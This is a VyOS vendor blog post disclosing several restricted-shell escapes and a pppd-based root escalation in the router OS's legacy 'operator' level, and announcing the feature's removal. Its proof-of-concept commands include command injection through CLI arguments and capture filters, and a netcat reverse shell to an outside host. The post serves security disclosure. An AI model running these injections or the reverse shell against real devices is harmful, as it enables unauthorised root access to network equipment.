=== Content from blog.vyos.io_52bb26a3_20250125_090938.html ===


* [VyOS Networks Blog](https://blog.vyos.io/)
* The "operator" level is proved insecure and will be removed in the next releases

# VyOS Networks Blog

Building an open source network OS for the people, together.

## The "operator" level is proved insecure and will be removed in the next releases

Daniil Baturin

Posted 1 Nov, 2018

The operator level in VyOS is a legacy feature that was inherited from the forked Vyatta Core code. It was always relatively obscure, and I don't think anyone really trusted its security, and for good reasons: with our current CLI architecture, real privilege separation isÂ  impossible.

Security researcher Rich Mirch found multiple ways to escape the restricted shell and execute commands with root permissions for the operator level users. Most of those would take a lot of effort to fix, and it's not clear if some of those can be fixed at all. Since any new implementation of a privilege separation system will be incompatible with the old one, and leaving operator level in the system is best described as "security theater", in the next releases that feature will be removed and operator level users will be converted to admin level users.

We will use the "id" UNIX command for demonstration since it's harmless but is not supposed to be available for operator level users. Here are proofs of concept for all vulnerabilities reported by Rich:

### Restricted shell escape using the telnet command

Proof of concept:

```
user1@vyos> telnet "127.0.0.1;bash"

telnet: can't connect to remote host (127.0.0.1): Connection refused

# we are now in real, unrestricted bash

user1@vyos> id

uid=1001(user1) gid=100(users) groups=100(users),...

```

This problem could potentially be fixed, but since there's no way to introduce global input sanitation, every command would have to be checked and protected individually.

### Restricted shell escape using the "monitor command" command

The "monitor command" command allows operator level users to execute any command. Using it in combination with netcat it's possible to launch an unrestricted bash shell:

```
user1@vyos> monitor command "$(netcat -e /bin/bash 192.168.x.x 9003)"

Connection from 192.168.x.x:59952

id

uid=1001(user1) gid=100(users) groups=100(users),4(adm),30(dip),37(operator),102(quaggavty),105(vyattaop)

hostname

vyos

```
### Restricted shell escape using the traffic dump filters

```
user1@vyos> monitor interfaces ethernet eth0 traffic detail unlimited filter "-w /dev/null 2>/dev/null & bash"

Capturing traffic on eth0 ...

id

uid=1001(user1) gid=100(users) groups=100(users),4(adm),30(dip),37(operator),102(quaggavty),105(vyattaop)

```
### Restricted shell escape using backtick evaluation as a set command argument

```
user1@vyos> set "`/bin/bash`"

user1@vyos> id >/dev/tty

uid=1001(user1) gid=100(users) groups=100(users),4(adm),30(dip),37(operator),102(quaggavty),105(vyattaop)

```

This one is special because there may not be a way to fix it at all.

### Local privilege escalarion using pppd connection scripts

Operator level users are allowed to call pppd for the connect/disconnect commands. Since pppd is executed with root permissions, a malicious operator can execute arbitrary commands as root using a custom PPP connection script.

```
user1@vyos> echo "id >/dev/tty" > id.sh

user1@vyos> chmod 755 id.sh

Execute the id command as root using the sudo /sbin/pppd command.

user1@vyos> sudo /sbin/pppd connect $PWD/id.sh

uid=0(root) gid=0(root) groups=0(root)

```

The post categories:
[security](https://blog.vyos.io/tag/security)
[Uncategorized](https://blog.vyos.io/tag/uncategorized)

Share:

[Share via Facebook](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fblog.vyos.io%2Fthe-operator-level-is-proved-insecure-and-will-be-removed-in-the-next-releases)
[Share via Twitter](https://twitter.com/intent/tweet?url=https%3A%2F%2Fblog.vyos.io%2Fthe-operator-level-is-proved-insecure-and-will-be-removed-in-the-next-releases&text=The+%26quot%3Boperator%26quot%3B+level+is+proved+insecure+and+will+be+removed+in+the+next+releases)
Share via Email
[Share via LinkedIn](https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fblog.vyos.io%2Fthe-operator-level-is-proved-insecure-and-will-be-removed-in-the-next-releases&title=The+%26quot%3Boperator%26quot%3B+level+is+proved+insecure+and+will+be+removed+in+the+next+releases&summary=The+%22operator%22+level+is+proved+insecure+and+will+be+removed+in+the+next+releases)

+
### Subscribe to our Blog

## Comments

+
### Subscribe Here!

## Blog Categories

[![](https://blog.vyos.io/hubfs/blog_images/rss.svg)
RSS Feed](https://blog.vyos.io/rss.xml)
![arrow](https://blog.vyos.io/hubfs/blog_images/arrow-bottom.svg)

* [279Uncategorized](https://blog.vyos.io/tag/uncategorized)
* [69announcement](https://blog.vyos.io/tag/announcement)
* [51release](https://blog.vyos.io/tag/release)
* [46vyos](https://blog.vyos.io/tag/vyos)
* [38security](https://blog.vyos.io/tag/security)
* [37project updates](https://blog.vyos.io/tag/project-updates)
* [341.2](https://blog.vyos.io/tag/1-2)
* [331.4](https://blog.vyos.io/tag/1-4)
* [33development](https://blog.vyos.io/tag/development)
* [30maintenance](https://blog.vyos.io/tag/maintenance)
* [281.3](https://blog.vyos.io/tag/1-3)
* [22news](https://blog.vyos.io/tag/news)
* [19release candidate](https://blog.vyos.io/tag/release-candidate)
* [15community](https://blog.vyos.io/tag/community)
* [15lts](https://blog.vyos.io/tag/lts)
* [15tutorial](https://blog.vyos.io/tag/tutorial)
* [141.5](https://blog.vyos.io/tag/1-5)
* [11aws](https://blog.vyos.io/tag/aws)
* [11documentation](https://blog.vyos.io/tag/documentation)
* [11epa](https://blog.vyos.io/tag/epa)
* [11ipsec](https://blog.vyos.io/tag/ipsec)
* [10announce](https://blog.vyos.io/tag/announce)
* [10update](https://blog.vyos.io/tag/update)
* [9commercial support](https://blog.vyos.io/tag/commercial-support)
* [9infrastructure](https://blog.vyos.io/tag/infrastructure)
* [9vyos 2.0](https://blog.vyos.io/tag/vyos-2-0)
* [8misc](https://blog.vyos.io/tag/misc)
* [8vpn](https://blog.vyos.io/tag/vpn)
* [8vyconf](https://blog.vyos.io/tag/vyconf)
* [7access subscriptions](https://blog.vyos.io/tag/access-subscriptions)
* [7bgp](https://blog.vyos.io/tag/bgp)
* [7cloud](https://blog.vyos.io/tag/cloud)
* [7commercial services](https://blog.vyos.io/tag/commercial-services)
* [7downtime](https://blog.vyos.io/tag/downtime)
* [6Maintenance Notification](https://blog.vyos.io/tag/maintenance-notification)
* [6openvpn](https://blog.vyos.io/tag/openvpn)
* [5azure](https://blog.vyos.io/tag/azure)
* [5cli](https://blog.vyos.io/tag/cli)
* [5firewall](https://blog.vyos.io/tag/firewall)
* [5hardware](https://blog.vyos.io/tag/hardware)
* [5vyos project](https://blog.vyos.io/tag/vyos-project)
* [4bug](https://blog.vyos.io/tag/bug)
* [4crux](https://blog.vyos.io/tag/crux)
* [4holiday](https://blog.vyos.io/tag/holiday)
* [4mirror](https://blog.vyos.io/tag/mirror)
* [4rolling release](https://blog.vyos.io/tag/rolling-release)
* [4vulnerability](https://blog.vyos.io/tag/vulnerability)
* [3api](https://blog.vyos.io/tag/api)
* [3beta](https://blog.vyos.io/tag/beta)
* [3conference](https://blog.vyos.io/tag/conference)
* [3contributors](https://blog.vyos.io/tag/contributors)
* [3donations](https://blog.vyos.io/tag/donations)
* [3frr](https://blog.vyos.io/tag/frr)
* [3gre](https://blog.vyos.io/tag/gre)
* [3meeting](https://blog.vyos.io/tag/meeting)
* [3microsoft](https://blog.vyos.io/tag/microsoft)
* [3nat](https://blog.vyos.io/tag/nat)
* [3offtopic](https://blog.vyos.io/tag/offtopic)
* [3open-source](https://blog.vyos.io/tag/open-source)
* [3poll](https://blog.vyos.io/tag/poll)
* [3qos](https://blog.vyos.io/tag/qos)
* [3scripting](https://blog.vyos.io/tag/scripting)
* [3vyos foundation](https://blog.vyos.io/tag/vyos-foundation)
* [2SeasonOfDocs](https://blog.vyos.io/tag/seasonofdocs)
* [2amazon](https://blog.vyos.io/tag/amazon)
* [2automation](https://blog.vyos.io/tag/automation)
* [2bigthanks](https://blog.vyos.io/tag/bigthanks)
* [2certifications](https://blog.vyos.io/tag/certifications)
* [2changes](https://blog.vyos.io/tag/changes)
* [2dns](https://blog.vyos.io/tag/dns)
* [2edgecore](https://blog.vyos.io/tag/edgecore)
* [2equuleus](https://blog.vyos.io/tag/equuleus)
* [2future](https://blog.vyos.io/tag/future)
* [2governance](https://blog.vyos.io/tag/governance)
* [2high availability](https://blog.vyos.io/tag/high-availability)
* [2ids](https://blog.vyos.io/tag/ids)
* [2ipoe](https://blog.vyos.io/tag/ipoe)
* [2ipv6](https://blog.vyos.io/tag/ipv6)
* [2is-is](https://blog.vyos.io/tag/is-is)
* [2lanner](https://blog.vyos.io/tag/lanner)
* [2live stream](https://blog.vyos.io/tag/live-stream)
* [2macsec](https://blog.vyos.io/tag/macsec)
* [2migration scripts](https://blog.vyos.io/tag/migration-scripts)
* [2notification](https://blog.vyos.io/tag/notification)
* [2nutanix](https://blog.vyos.io/tag/nutanix)
* [2outage](https://blog.vyos.io/tag/outage)
* [2ova](https://blog.vyos.io/tag/ova)
* [2portal](https://blog.vyos.io/tag/portal)
* [2project insights](https://blog.vyos.io/tag/project-insights)
* [2sentrium](https://blog.vyos.io/tag/sentrium)
* [2snmp](https://blog.vyos.io/tag/snmp)
* [2special offers](https://blog.vyos.io/tag/special-offers)
* [2survey](https://blog.vyos.io/tag/survey)
* [2talk](https://blog.vyos.io/tag/talk)
* [2telemetry](https://blog.vyos.io/tag/telemetry)
* [2thanksgiving](https://blog.vyos.io/tag/thanksgiving)
* [2ubiquiti](https://blog.vyos.io/tag/ubiquiti)
* [2vmware](https://blog.vyos.io/tag/vmware)
* [2vpp](https://blog.vyos.io/tag/vpp)
* [2vrrp](https://blog.vyos.io/tag/vrrp)
* [2wiki](https://blog.vyos.io/tag/wiki)
* [12017](https://blog.vyos.io/tag/2017)
* [12020](https://blog.vyos.io/tag/2020)
* [12021](https://blog.vyos.io/tag/2021)
* [1UI](https://blog.vyos.io/tag/ui)
* [1Work](https://blog.vyos.io/tag/work)
* [1as-path](https://blog.vyos.io/tag/as-path)
* [1australia](https://blog.vyos.io/tag/australia)
* [1badges](https://blog.vyos.io/tag/badges)
* [1build system](https://blog.vyos.io/tag/build-system)
* [1case study](https://blog.vyos.io/tag/case-study)
* [1christmas](https://blog.vyos.io/tag/christmas)
* [1containers](https://blog.vyos.io/tag/containers)
* [1controller](https://blog.vyos.io/tag/controller)
* [1covid-19](https://blog.vyos.io/tag/covid-19)
* [1cyber monday](https://blog.vyos.io/tag/cyber-monday)
* [1dellemc](https://blog.vyos.io/tag/dellemc)
* [1dmvpn](https://blog.vyos.io/tag/dmvpn)
* [1dummy](https://blog.vyos.io/tag/dummy)
* [1edgeos](https://blog.vyos.io/tag/edgeos)
* [1eol](https://blog.vyos.io/tag/eol)
* [1eos](https://blog.vyos.io/tag/eos)
* [1epic fail](https://blog.vyos.io/tag/epic-fail)
* [1event](https://blog.vyos.io/tag/event)
* [1evpn](https://blog.vyos.io/tag/evpn)
* [1fosdem](https://blog.vyos.io/tag/fosdem)
* [1fud](https://blog.vyos.io/tag/fud)
* [1get paid](https://blog.vyos.io/tag/get-paid)
* [1gigaom](https://blog.vyos.io/tag/gigaom)
* [1giveaway](https://blog.vyos.io/tag/giveaway)
* [1greeting](https://blog.vyos.io/tag/greeting)
* [1groups](https://blog.vyos.io/tag/groups)
* [1hcl](https://blog.vyos.io/tag/hcl)
* [1hiring](https://blog.vyos.io/tag/hiring)
* [1ideology](https://blog.vyos.io/tag/ideology)
* [1incident](https://blog.vyos.io/tag/incident)
* [1ipip](https://blog.vyos.io/tag/ipip)
* [1ips](https://blog.vyos.io/tag/ips)
* [1issue notification](https://blog.vyos.io/tag/issue-notification)
* [1japan](https://blog.vyos.io/tag/japan)
* [1jobs](https://blog.vyos.io/tag/jobs)
* [1kernel](https://blog.vyos.io/tag/kernel)
* [1lab](https://blog.vyos.io/tag/lab)
* [1licensing](https://blog.vyos.io/tag/licensing)
* [1load balancing](https://blog.vyos.io/tag/load-balancing)
* [1look at the date](https://blog.vyos.io/tag/look-at-the-date)
* [1look at the post date](https://blog.vyos.io/tag/look-at-the-post-date)
* [1loopback](https://blog.vyos.io/tag/loopback)
* [1market report](https://blog.vyos.io/tag/market-report)
* [1milestone](https://blog.vyos.io/tag/milestone)
* [1monitoring](https://blog.vyos.io/tag/monitoring)
* [1mpls](https://blog.vyos.io/tag/mpls)
* [1mwc](https://blog.vyos.io/tag/mwc)
* [1mwc2024](https://blog.vyos.io/tag/mwc2024)
* [1not-really](https://blog.vyos.io/tag/not-really)
* [1note the date](https://blog.vyos.io/tag/note-the-date)
* [1nutanix ahv](https://blog.vyos.io/tag/nutanix-ahv)
* [1opencollective](https://blog.vyos.io/tag/opencollective)
* [1openssl](https://blog.vyos.io/tag/openssl)
* [1oracle](https://blog.vyos.io/tag/oracle)
* [1ovf](https://blog.vyos.io/tag/ovf)
* [1partnerships](https://blog.vyos.io/tag/partnerships)
* [1political statement](https://blog.vyos.io/tag/political-statement)
* [1pppoe](https://blog.vyos.io/tag/pppoe)
* [1private cloud](https://blog.vyos.io/tag/private-cloud)
* [1python](https://blog.vyos.io/tag/python)
* [1question](https://blog.vyos.io/tag/question)
* [1radhat](https://blog.vyos.io/tag/radhat)
* [1remote access](https://blog.vyos.io/tag/remote-access)
* [1resolved](https://blog.vyos.io/tag/resolved)
* [1rewrite](https://blog.vyos.io/tag/rewrite)
* [1rip](https://blog.vyos.io/tag/rip)
* [1routing](https://blog.vyos.io/tag/routing)
* [1side-projects](https://blog.vyos.io/tag/side-projects)
* [1sit](https://blog.vyos.io/tag/sit)
* [1slack](https://blog.vyos.io/tag/slack)
* [1social media](https://blog.vyos.io/tag/social-media)
* [1ssl](https://blog.vyos.io/tag/ssl)
* [1statistics](https://blog.vyos.io/tag/statistics)
* [1stoprussia](https://blog.vyos.io/tag/stoprussia)
* [1technology exchange](https://blog.vyos.io/tag/technology-exchange)
* [1tunnel](https://blog.vyos.io/tag/tunnel)
* [1ukraine](https://blog.vyos.io/tag/ukraine)
* [1use cases](https://blog.vyos.io/tag/use-cases)
* [1usg](https://blog.vyos.io/tag/usg)
* [1vcne](https://blog.vyos.io/tag/vcne)
* [1versioning](https://blog.vyos.io/tag/versioning)
* [1vmworld](https://blog.vyos.io/tag/vmworld)
* [1vrf](https://blog.vyos.io/tag/vrf)
* [1vyos lab](https://blog.vyos.io/tag/vyos-lab)
* [1wireless](https://blog.vyos.io/tag/wireless)
* [1workaround](https://blog.vyos.io/tag/workaround)
* [1xcp-ng](https://blog.vyos.io/tag/xcp-ng)

[See All Categories](/)


